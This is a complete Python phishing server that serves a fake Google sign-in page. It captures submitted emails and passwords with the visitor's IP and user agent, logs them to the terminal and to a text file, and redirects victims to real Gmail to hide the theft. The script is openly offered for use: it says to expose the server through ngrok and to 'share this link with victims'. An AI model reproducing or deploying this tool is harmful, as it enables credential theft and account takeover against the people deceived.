#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import json
import threading
import time
from datetime import datetime

PORT = 8080
captured_creds = []

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_phishing_page()
        else:
            self.send_404()
    
    def do_POST(self):
        # CAPTURE CREDENTIALS FROM POST DATA
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse form data
        parsed_data = urllib.parse.parse_qs(post_data)
        email = parsed_data.get('email', [''])[0]
        password = parsed_data.get('password', [''])[0]
        
        if email and password:
            capture_data = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'email': email,
                'password': password,
                'ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown')
            }
            captured_creds.append(capture_data)
            
            # 🔥 PRINT DIRECTLY TO TERMINAL - INSTANT!
            print("\n" + "="*60)
            print("🎣 NEW VICTIM CAUGHT! 🎣")
            print("="*60)
            print(f"📧 EMAIL:    {email}")
            print(f"🔑 PASS:     {password}")
            print(f"🌐 IP:       {self.client_address[0]}")
            print(f"⏰ TIME:     {capture_data['timestamp']}")
            print(f"🖥️  AGENT:   {self.headers.get('User-Agent', 'Unknown')[:100]}...")
            print("="*60 + "\n")
            
            # Save to file also
            with open('captured_creds.txt', 'a') as f:
                f.write(json.dumps(capture_data) + '\n')
        
        # Redirect to real Google
        self.send_response(302)
        self.send_header('Location', 'https://mail.google.com')
        self.end_headers()
    
    def send_phishing_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account - Sign in</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Roboto', Arial, sans-serif; 
            background: linear-gradient(45deg, #4285f4, #34a853, #fbbc05, #ea4335); 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 20px;
        }
        .container { 
            background: white; 
            padding: 40px; 
            border-radius: 8px; 
            box-shadow: 0 10px 40px rgba(0,0,0,0.3); 
            width: 100%; 
            max-width: 400px; 
        }
        .google-logo { height: 24px; margin: 0 auto 24px; display: block; }
        h1 { text-align: center; color: #202124; font-size: 24px; font-weight: 400; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #5f6368; font-size: 16px; margin-bottom: 32px; }
        .form-group { margin-bottom: 24px; }
        label { display: block; color: #3c4043; font-size: 14px; font-weight: 500; margin-bottom: 8px; }
        input { width: 100%; padding: 13px 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { outline: none; border-color: #4285f4; box-shadow: 0 0 0 2px rgba(66,133,244,0.2); }
        .signin-btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 8px; }
        .signin-btn:hover:not(:disabled) { background: #1557b0; }
        .signin-btn:disabled { background: #ccc; cursor: not-allowed; }
        .loading { display: none; text-align: center; padding: 20px; color: #5f6368; }
        .success { display: none; background: #34a853; color: white; padding: 20px; border-radius: 4px; margin-top: 16px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <svg class="google-logo" viewBox="0 0 126 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M18.77 0c5.59-7.25 15.23-7.25 20.82 0l5.23 6.61-5.23 6.6-5.23-6.61z" fill="#4285f4"/>
            <path d="M39.23 0h7.2v14h-7.2z" fill="#34a853"/>
            <path d="M52.01 0l4.9-6.1 5.71 7.1v-6.9l1.41 0 0 16v-6.66l5.71-7.1 4.9 6.1V14h3.58l-1.41 6.6h-3.58V14h7.2l-7.2 9.6-5.71-7.1v6.66h-7.2z" fill="#fbbc05"/>
        </svg>
        
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        
        <form id="loginForm" method="POST" action="/">
            <div class="form-group">
                <label>Email or phone</label>
                <input type="email" id="email" name="email" placeholder="example@gmail.com" required autocomplete="email">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
            </div>
            <button type="submit" class="signin-btn" id="submitBtn">Next</button>
        </form>
        
        <div class="loading" id="loading">🔄 Checking your account...</div>
        <div class="success" id="success">
            <div>✅ Welcome back!</div>
            <div>Redirecting to Gmail...</div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').onsubmit = function() {
            document.getElementById('submitBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
        }
    </script>
</body>
</html>'''
        self.wfile.write(html.encode())
    
    def send_404(self):
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b'Not Found')

def show_stats():
    while True:
        time.sleep(10)
        print(f"\n📊 STATS: {len(captured_creds)} victims captured | Server running on http://0.0.0.0:{PORT}")
        if captured_creds:
            print("💾 Check captured_creds.txt for all data")

if __name__ == "__main__":
    print("🚀 Termux Phishing Server Starting...")
    print(f"🌐 Open: http://localhost:{PORT}")
    print("🔗 Public URL (ngrok): ngrok http " + str(PORT))
    print("📱 Share this link with victims!")
    print("="*60)
    
    # Start stats thread
    stats_thread = threading.Thread(target=show_stats, daemon=True)
    stats_thread.start()
    
    # Start server
    with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
        print(f"✅ Server ready on port {PORT}!")
        print("🎣 Waiting for victims...\n")
        httpd.serve_forever()
